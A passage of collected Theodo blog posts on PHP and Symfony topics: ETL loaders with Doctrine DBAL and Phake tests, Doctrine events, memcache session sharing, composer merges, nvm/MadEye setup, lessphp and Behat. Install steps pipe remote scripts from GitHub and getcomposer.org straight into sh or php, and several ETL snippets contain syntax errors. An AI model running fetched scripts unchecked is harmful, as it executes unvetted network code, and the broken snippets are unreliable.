the transformer and the loader is exactly the same. Here is\nthe code, you can write some tests using the same method as for the extractor.\nThis time when you define the services use a connection to the new database\nas parameter:\nclass ArticleTransformer\r\n{\r\n        private $connection;\r\n\r\n        public function __construct(\\Doctrine\\DBAL\\Connection $connection)\r\n        {\r\n                $this->connection = $connection;\r\n        }\r\n\r\n        public function transform($article) {\r\n                $article->setAuthorId($this->defineAuthorId($article->getAuthorLegacyId));\r\n        }\r\n\r\n        private function defineAuthorId($legacyId)\r\n        {\r\n                $query = 'SELECT id FROM user WHERE legacy_id = :legacyId';\r\n                $queryData = array('legacyId' => $legacyId);\r\n                $id = $this->connection->fetchColumn($query, $queryData, 0);\r\n\r\n                return $id;\r\n        }\r\n}\nclass ArticleLoader\r\n{\r\n        private $connection;\r\n\r\n        public function __construct(\\Doctrine\\DBAL\\Connection $connection)\r\n        {\r\n                $this->connection = $connection;\r\n        }\r\n\r\n        public function load($article)\r\n        {\r\n                if (!$article->isValid()) {\r\n                        throw new \\InvalidArgumentException('Wrong format');\r\n                }\r\n\r\n                try {\r\n                        $this->connection->transactional(function ($connection) use ($article) {\r\n\r\n                                $queryData = $this->getQueryData($article);\r\n                                $id = $connection->fetchColumn($this->getUpdateQuery(), $queryData, 0);\r\n\r\n                                //if couldn't update then insert\r\n                                if (0 >= $id) {\r\n                                        $connection->fetchColumn($this->getInsertQuery(), $queryData, 0);\r\n                                }\r\n                        });\r\n                } catch (\\Exception $e) {\r\n                        throw new \\InvalidArgumentException('Fail migrating article #'.$article>getLegacyId().\"\\n\".'Connection error message : '.$e->getMessage());\r\n                }\r\n        }\r\n\r\n        private function getQueryData($article)\r\n        {\r\n                return array(\r\n                        'legacy_id' => $article->getLegacyId(),\r\n                        'authorId' => $article->getAuthorId(),\r\n                        'content' => $article->getContent(),\r\n                );\r\n        }\r\n\r\n        private function getUpdateQuery()\r\n        {\r\n                return 'UPDATE article SET author = :authorId, content = :content WHERE legacy_id = :legacyId RETURNING id';\r\n        }\r\n\r\n        private function getInsertQuery()\r\n        {\r\n                return 'INSERT INTO article (id, author, content, legacy_id) VALUES ((nextval('article_id_seq'), :authorId, :content, :legacyId) RETURNING id)';\r\n        }\r\n}\nI also had to update the parameter bag by adding an authorId field and\nan isValid() method:\nclass Article\r\n{\r\n        private $authorLegacyId;\r\n        private $authorId;\r\n        private $content;\r\n        private $legacyId;\r\n\r\n        //Write the getter and setter\r\n\r\n        public function hydrate($data)\r\n        {\r\n                if (!isset($data['content']) OR empty($data['content'])) {\r\n                        throw new \\InvalidArgumentException('Invalid content');\r\n                }\r\n                if (!isset($data['authorLegacyId']) OR $data['authorLegacyId'] < 1) {\r\n                        throw new \\InvalidArgumentException('Invalid author legacy id');\r\n                }\r\n                if (!isset($data['legacyId']) OR $data['legacyId'] < 1) {\r\n                        throw new \\InvalidArgumentException('Invalid legacy id');\r\n                }\r\n\r\n                $this->setContent($data['content']);\r\n                $this->setLegacyId($data['legacyId']);\r\n                $this->setAuthorLegacyId($data['authorLegacyId']));\r\n        }\r\n\r\n        public function isValid()\r\n        {\r\n                return  ! empty($this->content) AND $this->authorId > 0;\r\n        }\r\n}\n\n\nWriting test when using a transactionnal\nOne problem you may have when trying to write tests for the loader\nis that it uses a transactionnal, which encapsulates the queries.\nHere is a way around. Let\u2019s assume I have already phaked a connection\nin $this->connection and have a loader ($this->loader):\n/**\r\n * @param HabitationLegalEntityResult $data\r\n * @dataProvider providerDummyTransformerResult\r\n */\r\npublic function testQueries(HabitationLegalEntityResult $data)\r\n{\r\n        //Update everytime\r\n        Phake::when($this->connection)->fetchColumn((Phake::anyParameters()), (Phake::anyParameters()), 0)->thenReturn(1);\r\n\r\n        $this->loader->load($data, false);\r\n        Phake::verify($this->connection, Phake::times(1))->transactional(Phake::capture($trans));\r\n        call_user_func($trans, $this->connection);\r\n\r\n        Phake::verify($this->connection, Phake::times(1))->fetchColumn(\r\n                Phake::capture($query)->when($this->matchesRegularExpression('#^UPDATE#is')),\r\n                (Phake::capture($queryData)),\r\n                0\r\n        );\r\n\r\n        //I can do test with the $query and the $queryData of the Update Query\r\n\r\n        //Has to do insert because Phake update will return -1 then insert will return 1\r\n        Phake::when($this->connection)->fetchColumn((Phake::anyParameters()), (Phake::anyParameters()), 0)\r\n                ->thenReturn(-1)->thenReturn(1);\r\n\r\n        $this->loader->load($data, false);\r\n        Phake::verify($this->connection, Phake::times(2))->transactional(Phake::capture($trans)); // second time transactional is called in the test\r\n        call_user_func($trans, $this->connection);\r\n\r\n        Phake::verify($this->connection, Phake::times(1))->fetchColumn(\r\n                Phake::capture($query)->when($this->matchesRegularExpression('#^INSERT INTO#is')),\r\n                (Phake::capture($queryData)),\r\n                0\r\n        );\r\n        //I can do test with the $query and the $queryData of the Insert Query\r\n}\n\n\nConclusion\nYou now know the basic of implementing ETL services command. As you have seen\nthe layout for it is very unspecific. This allows you to write abstract class\nto factor the code if you plan to use multiple ETL command or simply to start\ncoding an almost functionnal command even if you are still not sure of how\nto get or load the data.\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tJean-Matthieu Gallard\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t\nHere is an introduction to events in Doctrine and the changes brought by Doctrine 2.4. You will find all the code in this article on the following github repository.\n\nEvents in doctrine\nDoctrine launches many events during the lifecycle of an entity.\nThe most commonly used are:\n\nprePersist: this event is launched before persisting an entity\npostPersist: this event is launched after persisting an entity\npreUpdate: this event is launched before updating an entity\npostUpdate: this event is launched after updating an entity\npreRemove: this event is launched before deleting an entity\npostRemove: this event is launched after deleting an entity\n\nYou can find a list of all doctrine events here:\nhttp://docs.doctrine-project.org/en/latest/reference/events.html#lifecycle-events\n\n\nIn a doctrine entity\nTo use events in an entity you have to specify Lifecycle Callbacks with the help of annotations. We will take the example of an ant class:\n/**\r\n* Ant\r\n*\r\n* @ORM\\Table()\r\n* @ORM\\HasLifecycleCallbacks\r\n*/\r\nclass Ant\r\n{\nTo attach a listener to a Doctrine Event, you can add the @ORMPrePersist to the function in your entity class like this:\n/**\r\n* @ORM\\PrePersist\r\n*/\r\npublic function setCreatedAtAndUpdatedAtPrePersist()\r\n{\r\n    $now = new \\Datetime();\r\n\r\n    $this->createdAt = $now;\r\n    $this->updatedAt = $now;\r\n}\nThe changes in Doctrine 2.4 make it possible to access an $event variable of type LifecycleEventArgs or PreUpdateEventArgs. With it you have access to the EntityManager and the UnitOfWork.\nclass Ant {\r\n...\r\n    /**\r\n    * @ORM\\PostUpdate\r\n    */\r\n    public function postUpdate(LifecycleEventArgs $event)\r\n    {\r\n        $entity = $event->getEntity();\r\n        $em = $event->getEntityManager();\r\n\r\n        ...\r\n    }\r\n\r\n    /**\r\n    *\r\n    * @ORM\\PreUpdate\r\n    */\r\n    public function casteRules(PreUpdateEventArgs $event)\r\n    {\r\n        $entity = $event->getEntity();\r\n        $em = $event->getEntityManager();\r\n\r\n        if ($event->hasChangedField('caste') == self::CASTE_QUEEN) {\r\n           $this->caste = $event->getOldValue('caste');\r\n        }\r\n    }\r\n}\nOk it\u2019s nice and all but keep in mind that you absolutely want to separate the logic from your entity to have an easily readable code \ud83d\ude09 That is why there are doctrine listeners.\n\n\nDoctrine Listeners\nIn this section I will show you how to use listeners in Doctrine 2.4.\nCreating a listener is very easy. First, annotate an entity with:\n@ORM\\EntityListeners({\"UserListener\"})\nYou can specify multiple listeners like this:\n@ORM\\EntityListeners({\"UserListener\", \"UserListener2\u201d})\nBut do not forget that if your listener is in another directory you must specify its namespace\n@ORM\\EntityListeners({\"kosssi/UserBundle/Listener/UserListener\"})\nSecondly, create your own listener class in which you will be able to use all event functions like postPersist, preUpdate, postUpdate, etc. Here is a quick example of what your prePersist function could look like:\npublic function prePersist(Snake $snake, LifecycleEventArgs $event)\r\n{\r\n   $now = new \\Datetime();\r\n\r\n   $snake->setCreatedAt($now);\r\n   $snake->setUpdatedAt($now);\r\n}\nYou should immediately see a problem: What if you want to access other services from the listener? Since it is Doctrine that instantiates your listener, you cannot add parameters to the constructor.\nThis is where the ResolverListener comes in. You can create only one ResolverListener by project. In this class you will need to do the mapping between the listener name and the listener service that you have previously created in your services.yml with any parameters you want.\nclass ListenerResolver extends DefaultEntityListenerResolver\r\n{\r\n    public function __construct($container)\r\n    {\r\n           $this->container = $container;\r\n    }\r\n\r\n    public function resolve($className)\r\n    {\r\n        $id = null;\r\n        if ($className === 'kosssi\\ExampleDoctrineEventsBundle\\Listener\\SnakeSizeListener') {\r\n            $id = 'kosssi_listener_snake_size';\r\n        }\r\n\r\n        if (is_null($id)) {\r\n            return new $className();\r\n        } else {\r\n            return $this->container->get($id);\r\n        }\r\n    }\r\n}\nIt\u2019s easy to configure the listener resolver in config.yml with DoctrineBundle:\ndoctrine:\r\n    orm:\r\n        entity_listener_resolver: user_listener_resolver\n\n\nIn conclusion\nSo you see it is quite simple to create events in Doctrine. Events programming is really exciting since it allows you to interact with objects as they change and go through their lifecycles.\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tSimon Constans\r\n  \t\t\t\r\n  \t\t\t\tSimon Constans - Web developper for Theodo. I have been working with Symfony2 since its initial release and I keep searching for new development and design features. In short: I love Symfony2 and CSS3.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tNot long ago, Theodo released it\u2019s SessionBundle which aim is to share the session between a symfony1x and a Symfony2 website.\nOn a local server, very little configuration is needed to use this bundle. The sharing is available after a few minutes configuration.\nWhen we implemented it on one website, the session sharing was working on our Vagrant box, but once it has been deployed we noticed that it was not working anymore.\nThe platform used by this website was configured to be able to accept more servers if needed, so the sesssion was stored on a memcache server.\nWe can deal with this in 3 simple steps:\n1. Check the Symfony1\n2. Setup the Symfony2\n3. Setup the session sharing\n\nPre-configuration\nInstall the php5-memcache package using either pecl or apt-get:\napt-get install php5-memcache\r\npecl install memcache\nAdd a file in your php config directory (/etc/php5/conf.d/999.memcache.ini) to force the memcache session  torage:\nsession.save_handler = \"memcache\"\r\nsession.save_path = \"memcache.server:11211\"\n\n\nSymfony 1x\nConfigure your application with the following directive:\nmemcache_enabled: true\r\n.array:\r\n  server_01:\r\n    server_address: memcache.server\r\n    server_port: 11211\n\n\nSymfony 2.2\nInstall the TheodoEvolutionSessionBundle and follow the installation directive.\nBy default, Symfony2 overrides the php.ini directive to store the session.\nYou will have to define a service in the config.yml file to store the session in memcache:\nservices:\r\n    memcache:\r\n        class: Memcache\r\n        calls:\r\n            - [ addServer, [ %memcache_host%, %memcache_port% ]]\r\n    session.handler.memcache:\r\n        class: Symfony\\Component\\HttpFoundation\\Session\\Storage\\Handler\\MemcacheSessionHandler\r\n        arguments: [ @memcache, { expiretime: %memcache_expire% } ]\nYou will also have to specify some arguments for the session in your config.yml file:\nsession:\r\n    handler_id: %session_handler_id%\r\n    name: frontend_session #Or put the name related to your symfony application\r\n    save_path: %session_save_path%\r\n    cookie_domain: %session_cookie_domain%\nPut the parameters into your parameter.yml file:\nmemcache_host: memcache.test\r\nmemcache_port: 11211\r\nmemcache_expiretime: 86400\r\nsession_handler_id: session.handler.memcache\r\nsession_save_path: 'tcp://memcache.server:11211'\r\nsession_cookie_domain: .test.fr\n\n\nSession with subdomains\nIf the Symfony2 webserver is accessed by a subdomain, you will need to make your session cookie from the symfony1x accessible by it.\nIn the factories.yml add the following configuration:\nstorage:\r\n  param:\r\n    session_domain_cookie: .test.fr\nIf you look deeper into the session sharing, on the symfony1x the cookie should looks like session_number\nOn your local server, if you list all the files in the /var/lib/php5 directory, you will see a file prefix by sess_ and followed by the session_number.\nOn the memcache server, there are no prefixes, so you just have to set it in your parameters.yml file:\nsession_prefix: ''\nNote:\nYou cannot set the session prefix to ~, the default prefix will be used\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tNicolas Thal\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tOne of the difficulties when working with composer is how to merge its files.\nWhen you are working on multiple branches with your team members and two of you\nupdate the project, either to add a new package or to update one that is already\nused by the project, you end up having a nasty merge conflict.\nOne solution for this would be a global composer update but this would result\nin updating all bundles and some changes that are not tested could introduce bugs.\nEven an update of only concerned bundles does not assure that you will end up with\nthe same bundle version that your colleague has tested.\nSo, what good practices could you adopt to make sure you are safe after a merge of\ncomposer files?\n\nKeep your composer up to date\nComposer is still evolving and so are the files it uses. It may be one of the sources of conflicts \u2013 even if there were no major changes in the composer.json, a different composer version may generate a completely different composer.lock. To avoid such kind of merge errors, keep your composer up to date and use the same version in the team. If you use a composer.phar versionned in the project you can put someone in charge of updating it. If you prefer using local copies per user you can fix a day of the week when everyone updates it or have someone mail the correct version to the whole team.\n\n\nKeep dependency changes visible\nAnyone who is merging another branch should be able to say what has changed and when. To make this easy follow those simple rules:\n1. Keep your commits atomic. If you are adding a dependency, make one addition at a time. Remember to keep your commit functional (in case someone needed to debug with git bisect) so think about updating your AppKernel and config files. If you are updating a dependency, composer lets you update packages separately:\ncomposer update vendor/package\n2. Keep a clear and consistent commit messages. Use a tag (like [deps]) and a good description. Use rather \u201c[deps] Update CoolBundle to 1.3\u201d or \u201c[deps] Add CoolerBundle 1.0.3\u201d than \u201cupdated deps\u201d.\n\n\nDo not use dependencies directly\nEverytime you use a dependency of another project, add it to your composer.json file. This will help you to make sure that none of your functionalities is broken by an indirect update.\n\n\nTry to never rely on dev-master\nWhether you are a package owner or developing a project that depends on some package, try to avoid relying on dev-master. It is just plain wrong, that your project will work with the latest version all the time so it has no informational value. Also, if one package depends on a tagged version and another depends on a dev-master version it is just hell to maintain.\nIf you want to use a package in dev-master version \u2013 contact the maintainer and ask him if he could add a branch alias so you would use it rather than the dev-master.\nIf you see a package that relies on dev-master branch of another package and it can be replaced by a branch/tag \u2013 think about submitting a pull-request that fixes the issue. The few seconds you spend on this may save you a lot of headaches later.\n\n\nResolve conflicts consistently\nHere is how you can resolve a composer conflict trying to keep most of the versions you are used to.\n1. Use git to start the merge from your version of the file:\n$ git checkout --ours composer.lock\n2. See what has changed in composer.json:\n$ git diff HEAD MERGE_HEAD -- composer.json\n3. If a dependency has been removed you can safely remove it with composer:\n$ composer update dependency-package\nIf there are no packages that were updated alongside you can safely add both composer files and finish the merge.\n4. For each updated package, modify your composer.json if a tag was updated. If not, you can use the commit hash notation to download the correct version.\nRemember to remove the commit tag once you have run the composer update command.\n5. For every package that was added you need to user composer update package. This may change other dependencies but, unless you want to keep track of all of them\n(which is not a great idea), it is your only option.\n\nThis is how I try to resolve a complicated composer merge when I face one. And how do you do it?\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tMarek Kalnik\r\n  \t\t\t\r\n  \t\t\t\tMarek Kalnik - a Technical Team Manager working with us since 2010 - is a PHP and JavaScript passionate. His main centers of interests include: Symfony 2, object-oriented JavaScript, code quality and good practices.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tTheodo is constantly looking to improve its code review tools and collaboration. Recently we have encountered a problem about how to organize pair programming sessions with our programmers working at client\u2019s offices. The fact that you are not in place should not prevent you from having your pair programming session with more experienced collegues!\nSo far we are testing MadEye which turns out quite good. I am going to show you how to install it using nvm and npm in few quick steps.\n\nUsing Node Version Manager\nNVM, a Node Version Manager is a tool that helps you manage multiple NodeJS versions.\nRun the following command to install it:\n\r\n$ curl https://raw.github.com/creationix/nvm/master/install.sh | sh\r\n\nYou do not need to have NodeJS installed to run the script, but it will not work without Git. If you want to install it without using Git, see the GitHub repository for more info.\nThis command adds an alias to your bash config files, so you can either execute $ source ~/.profile or restart your console in order to get nvm command working.\nOnce NVM is installed you can install NodeJs (I have tested MadEye with Node 0.10) and NPM:\n\r\n$ nvm install v0.10\r\n\nNote that NPM is already bundled with Node, so no need to install it separately.\nNow use NPM to install MadEye. NPM will download all dependencies automatically.\n\r\n$ npm install -g madeye\r\n\nNote: When using npm with nvm, you should not use sudo. All packages are installed in your home directory. If you used sudo accidentaly, change the owner of .nvm and .nmp to your user.\n\n\nUsage\nJust cd to your folder and type madeye. You should see something like that:\n\r\nEnabling MadEye in /var/www/theodo-site\r\nView your project at http://madeye.io/edit/{project-key}\r\nUse Google Hangout at https://plus.google.com/hangouts/_?gid={private-id}&gd=http://madeye.io/edit/{project-key}\r\n\nOnce you open GoogleHangout link, Google will ask you to give MadEye the permission to run and load your project. The madeye.io link becomes inactive once you stop sharing, but the GoogleHangout keep all files readable (no saving though).\nThe google hangout lets you see the folder directory structure, edit files in a GoogleDocs-like manner \u2013 each hangout participant has his own color of cursor. You can then synchronize filed to the project host or discard changes if it was only a proof of concept.\nSo far we encounter some performance problems while opening directories on files, but the code edition in one file is realtime. Both users navigate throught files independently, it is not a simple \"screen sharing\", so some communication is required (like \"Open this file, I\u2019ve modified that\"). Saving works well, there is no server-side code update though.\n\n\nTroubleshooting\nMadEye does not install\nSee if you have the required NodeJs version, type node --version\nYou have installed MadEye but the madeye command is not found\nIf you manage multiple Node versions with NVM, it is possible that it was installed with other NodeJs version.\nRun $ cd ~/.nvm && find -name madeye and see in which directory it is stored. Also check your default Node version nvm alias default and if there is none it may be a good\nidea to set it.\n\n\nHappy MadEying and let us know if you liked it or if you use any similar solutions!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tMarek Kalnik\r\n  \t\t\t\r\n  \t\t\t\tMarek Kalnik - a Technical Team Manager working with us since 2010 - is a PHP and JavaScript passionate. His main centers of interests include: Symfony 2, object-oriented JavaScript, code quality and good practices.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tWe have a good news to announce: Benjamin Grandfond joined Mathieu D\u00e4hne and me as our third Certified Symfony Developer. He is the 40th developer to have acquired this certification! Big congratulations, as it is not an easy certificate to get. We hope that other colleagues will follow him soon, confirming our highest level of expertise in the framework.\nIf you wish to know more about Benjamin, checkout out his GitHub profile or follow him on Twitter.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tMarek Kalnik\r\n  \t\t\t\r\n  \t\t\t\tMarek Kalnik - a Technical Team Manager working with us since 2010 - is a PHP and JavaScript passionate. His main centers of interests include: Symfony 2, object-oriented JavaScript, code quality and good practices.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tTuesday, May 14 was held on the monthly Symfony community meetings \u2013 sfPot. We were invited to P\u00e9pini\u00e8re 27 by Yoopies. As usual two talks were given and the discussions have continued in a bar.\nThe first lecture was a request from the community. We were asked to speak a little about tests, and Marek responded for the call. He gave a talk about the philosophy of tests in Symfony2. Value of Unit Tests and TDD in a project and he explained how simple is it to write unit tests leveraging the power of Phake \u2013 a framework for writing mocks. You can find the slides here.\nThe second talk, by Alexander Salom\u00e9 from SensioLabs, was an introduction to Symfony2 Forms. His talk was rich in real life examples and very well prepared. It covered the basics but there was also a lot of use cases interesting even for experienced developers.\nMany thanks to AFSY for organizing the event, and see you next month!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tSimon Constans\r\n  \t\t\t\r\n  \t\t\t\tSimon Constans - Web developper for Theodo. I have been working with Symfony2 since its initial release and I keep searching for new development and design features. In short: I love Symfony2 and CSS3.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tToday, we will talk about a little trick: How to use Less when node.js is not available on your server?\nWe will use the latest version of lessphp available at the time of writing this article. You can find the full list of tags on github : https://github.com/leafo/lessphp/tags.\nAssuming Composer is already installed, run the following command from your console to complete the installation:\nphp composer.phar require leafo/lessphp:0.3.9\nThe composer require command adds lessphp package to the composer.json file from the current directory and executes a composer update command.\nThen, we need to update our config file:\n# app/config/config.yml\r\n# Assetic Configuration\r\nassetic:\r\n    filters:\r\n        cssrewrite: ~\r\n        lessphp:\r\n            apply_to: \"\\.less$\"\r\n            #file:   %kernel.root_dir%/../vendor/leafo/lessphp/lessc.inc.php\nAssetic will change the paths to our assets and breaks all links that use relative paths.\nIn order to prevent this, we use cssrewrite filter that parses CSS files and rewrites paths to reflect the new location.\nWe use the \u2018apply_to\u2019 option so we don\u2019t need to specify the lessphp filter on the twig template.\n\u2018file\u2019 parameter is useless since this commit if we use Composer autoloading. (Thanks @stof)\nFinally, you can include your less files in the template like this:\n<!DOCTYPE html>\r\n<html>\r\n    <head>\r\n        <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" />\r\n\r\n        <title>My WebSite</title>\r\n        {% stylesheets\r\n            'bundles/acme/less/example.less'\r\n        %}\r\n            <link rel=\"stylesheet\" type=\"text/css\" media=\"screen\" href=\"{{ asset_url }}\"/>\r\n        {% endstylesheets %}\r\n    </head>\r\n    <body>\r\n        {% block body%}{% endblock %}\r\n    </body>\r\n</html>\nBecause of the latency between the new lesscss feature and his implementation in php, lessphp is not as good as the latter but it is possible to use it in most situations.\nYou can find more information on the lessphp website: http://leafo.net/lessphp/\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tJonathan Beurel\r\n  \t\t\t\r\n  \t\t\t\tJonathan Beurel - Web Developer. Twitter : @jonathanbeurel  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tWe are happy to anounce that the first Theodo Evolution Bundle has been open-sourced. The SessionBundle integrates transparently Legacy PHP Sessions into Symfony2\nOur team has been working for a while on the growing issue of migrating legacy applications to Symfony2, as you may have guessed from one of Fabrice Bernhard\u2019s recent conferences at the sfLive Berlin in November or the PHP NE conference in Newcastle last month. This has led to quite a bit of knowledge through trial and errors in actual projects, and also to the development of some Symfony2 bundles.\nAs was announced in Berlin some of those will be open-sourced : here is the first one !\nTheodo Evolution\u2019s SessionBundle allows to properly connect your legacy application with your Symfony2 app. It uses a simplified session bag instead of arrays used by Symfony2, to allow retreiving session data kept directly in $_SESSION. The bundle has been so far used and tested on several symfony 1.x projects but it can be used in other types of projects.\nObviously, this is only a small piece, we are still going to release a bit more code later.\nThe Bundle is licensed MIT so feel free to use it and send us your feedback, here or directly on Github !\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tPierre-Henri Cumenge\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t\nWarning : This blog post uses Behat 2.5. It is not all compatible with the ~3.0 version wich should be released on 20th of april 2014.\nAt the beginning of the year I decided it was time to give a try to BDD. Hence every new project I started from then on was done with BDD.\nI found at the time lots of documentation/tutorials on the subject, but none was exactly what I was hoping for when I begun: a standalone step-by-step tutorial that goes from installation to having tested a full user story through BDD, code samples included.\nTo help others get started BDD with Behat, I want to share with you such a basic tutorial. We will develop a simple calculator that takes an operation (like \u201c1+1\u201d) and returns a result on a web page. At the end of this post you will have a functional calculator and you should know basics to start using Behat in your projects.\n\nSetup the project\nFirst of all we need to install dependencies in our project, we\u2019ll use composer to do so:\n# composer.json\r\n{\r\n    \"autoload\": {\r\n        \"psr-0\": { \"Calculator\": \"src/\" }\r\n    },\r\n    \"require\": {\r\n        \"behat/behat\": \"*\",\r\n        \"behat/mink-extension\": \"*\",\r\n        \"behat/mink-goutte-driver\": \"*\"\r\n    },\r\n    \"minimum-stability\": \"dev\",\r\n    \"config\": {\r\n        \"bin-dir\": \"bin\"\r\n    }\r\n}\nThen install Composer (\u201ccurl -s https://getcomposer.org/installer | php\u201d) and run \u201cphp composer.phar install\u201d. Note that we also installed Mink and Goutte, that will allow us to easily test our web application.\n\n\nYour first feature\nA feature is a file that describes scenarios step by step.\nTo initialize our suite of features run the following command:\n~/calculator $ bin/behat --init\r\n+d features - place your *.feature files here\r\n+d features/bootstrap - place bootstrap scripts and static files here\r\n+f features/bootstrap/FeatureContext.php - place your feature related code here\nOnce the \u201cfeatures\u201d folder is created you can start writing your features. Create a file \u201ccalculator feature\u201d in your \u201cfeatures\u201d dir:\n#features/calculator.feature\r\nFeature: Calculator calculates operations and returns it to you\r\n\r\n    Scenario: Calculate 1+1 and return 2\r\n        Given I am on \"/index.php\"\r\n        When I fill in \"operation\" with \"1+1\"\r\n        And I press \"Ok\"\r\n        Then I should see \"2\" in the \"#result\" element\nThis needs some explanations. The first line contains the name of the feature after the keyword \u201cFeature\u201d.\nThen we wrote the first scenario of the feature right after the \u2018Scenario\u2019 keyword and gave it a name. As in this example, you can add a description of your scenario. Then we added the steps of the scenario describing what happens. Each step is prefixed by a keyword \u201cGiven\u201d, \u201cWhen\u201d, \u201cAnd\u201d and \u201cThen\u201d, this allows the scenario to be readable by both a human being and Behat.\nNote: See the Gherkin language documentation on Behat\u2019s website.\nOk, once the feature is written, we want to run behat to see the scenario fail:\n~/calculator $ bin/behat\r\nFeature: Calculator calculates operations and returns it to you\r\n\r\n  Scenario: Calculate 1+1 and return 2 # features/calculator.feature:3\r\n    Given I am on \"/index.php\"\r\n    When I fill in \"operation\" with \"1+1\"\r\n    And I press \"Ok\"\r\n    Then I should see \"2\" in the \"#result\" element\r\n\r\n1 scenario (1 undefined)\r\n4 steps (4 undefined)\r\n0m0.015s\r\n\r\nYou can implement step definitions for undefined steps with these snippets:\r\n\r\n/**\r\n * @Given /^I am on \"([^\"]*)\"$/\r\n */\r\npublic function iAmOn($arg1)\r\n{\r\n    throw new PendingException();\r\n}\r\n\r\n/**\r\n * @When /^I fill in \"([^\"]*)\" with \"([^\"]*)\"$/\r\n */\r\npublic function iFillInWith($arg1, $arg2)\r\n{\r\n    throw new PendingException();\r\n}\r\n\r\n/**\r\n * @Given /^I press \"([^\"]*)\"$/\r\n */\r\npublic function iPress($arg1)\r\n{\r\n    throw new PendingException();\r\n}\r\n\r\n/**\r\n * @Then /^I should see \"([^\"]*)\" in the \"([^\"]*)\" element$/\r\n */\r\npublic function iShouldSeeInTheElement($arg1, $arg2)\r\n{\r\n    throw new PendingException();\r\n}\nBehat told you a lot of interesting stuff\u2026 let\u2019s decompose it. First, it tells you that he cannot understand so far the step we gave it: you need to define what \u201cI am on\u201d means, for instance.\nThen it generates templates to help you write your step definitions. Most of the time you will copy/paste these templates in your context class generated 